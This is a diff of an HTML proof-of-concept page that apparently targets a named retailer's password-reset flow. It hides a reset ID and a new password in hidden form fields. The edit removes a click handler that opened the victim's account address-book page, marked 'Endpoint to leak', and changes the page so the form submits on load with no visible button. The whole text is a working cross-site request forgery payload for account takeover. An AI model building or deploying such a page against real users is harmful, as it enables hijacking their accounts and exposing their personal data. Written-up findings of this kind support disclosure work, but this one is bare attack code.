@@ -4,15 +4,11 @@
       <input type="hidden" name="passwordResetId" value="AA186DF468EB78921F9114BC71341C7431F227C0" />
       <input type="hidden" name="password" value="Uilirecs123" />
       <input type="hidden" name="confirmPassword" value="Uilirecs123" />
-      <input type="submit" value="Submit request" />
+      <input type="hidden" value="Submit request" />
     </form>
   </body>
   <script>
-    window.onclick = x => {
-      
-      var victimwindow = window.open("https://www.coolblue.be/en/my-coolblue-account/address-book") <!--Endpoint to leak-->
-      document.forms[0].submit();
-    }
+    document.forms[0].submit();
   </script>
 </html>
 
